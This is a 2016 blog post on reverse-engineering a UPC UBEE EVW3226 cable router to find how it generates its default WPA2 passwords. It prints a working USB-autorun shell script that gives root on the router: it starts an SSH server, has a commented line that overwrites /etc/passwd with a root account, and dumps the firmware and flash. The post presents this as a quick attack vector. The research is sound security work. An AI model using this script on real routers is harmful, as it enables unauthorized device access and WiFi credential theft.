---
layout: post
title:  "UPC UBEE EBW3226 WPA2 Password RExing"
date:   2016-06-14 19:11:48 +0200
categories: router reversing hacking

---

# Introduction

This work was motivated by the work of [Blasty](https://twitter.com/bl4sty).
Several months ago he published the algorithm ( [upc_keys.c](https://haxx.in/upc-wifi/) ) generating candidate default
WPA2 passwords for UPC WiFi routers using just SSID of the router. Vulnerable routers used just router ID to generate
default WiFi password and WiFi SSID. Algorithm goes through all possible router serial IDs and if SSID matches,
it prints out candidate WiFi password (cca 20).

To our surprise it worked pretty well in our city, where 6 out of 10 UPC WiFi around were vulnerable. But it didn’t
work for newer router models and for my own. So we decide to look at this particular model if we were lucky to find
the same vulnerability in it.

Our modem is UBEE EVW3226. As I don’t want to experiment on my own home router I bought one from the guy selling
exactly the same model. There are guys who managed to get root access to the router by connecting to the UART
interface of the router. I recommend going through this article: <https://www.freeture.ch/?p=766>

Lucky for us, we didn’t have to mess with the UART interface of the router even though I was looking forward to it.
Just a day before I bought my UBEE router for experiments, Firefart [published an article](https://firefart.at/post/upc_ubee_fail/)
how to get a root on the router just by inserting a USB drive with simple scripts.

Tl;dr: If USB drive has name `EVW3226`, shell script
`.auto` on it gets executed with system privileges. With this script you start SSH server, you connect
to the router and have the root.

With this I managed to dump the whole firmware on the mounted USB drive.
The script we use to start SSH daemon and to dump the firmware is below:

```bash
#!/bin/bash
if [ ! -e /etc/passwd.1 ]; then
	cp /etc/passwd /etc/passwd.1

    # This works!
    #echo "admin:FvTuBQSax2MqI:0:0:admin,,,:/:/bin/sh" > /etc/passwd
    dropbear -r /var/tmp/disk/dropbear_rsa_host_key -p 192.168.0.1:22

    # Dump router to the drive
    WHERE=/var/tmp/disk/HOMEROUTER
    mkdir -p ${WHERE}
    tar -cvpf ${WHERE}/router-image-root.tar -X/var/tmp/disk/tar-exclude /
    sync

    for i in 0 1 2 3 4 5 6 7 8 9 10; do echo "CurDisk: mtdblock$i"; dd if="/dev/mtdblock${i}"\
           of="${WHERE}/fw-${i}.bin" bs=1 conv=noerror; done
   for i in 0 1 2 3 4 5 6 7 8 9 10; do echo "CurDisk: mtd$i"; dd if="/dev/mtd${i}" \
           of="${WHERE}/fw-${i}b.bin" bs=1 conv=noerror; done
   sync

    DDIR=`pwd`
    WHERE=/var/tmp/media/0AAA-0E65/HOMEROUTER
    cd /
	mkdir -p $WHERE
	find /proc -type f | grep -v '/sys/' | grep -v '/net/' | grep -v '/kmsg' | \
       while read F ; do
   		D=${WHERE}/${F%/*}
   		echo "D: $D  F: $F WHERE: ${WHERE}$F"
   		test -d "$D" || mkdir -p $D && echo "DIR: $D"
   		test -f "${WHERE}$F" || cat $F > ${WHERE}$F
	done
	cd "$DDIR"
fi
```

This is actually very powerful and convenient attack vector. One comes with USB drive to the router, plugs it in and has a WPA2 password in seconds.

I’ve created a TAR of the whole filesystem plus raw binary images of the mounted file system.
With SSH I could start mess around the router firmware.

Firstly, the quick review of mounted file systems:


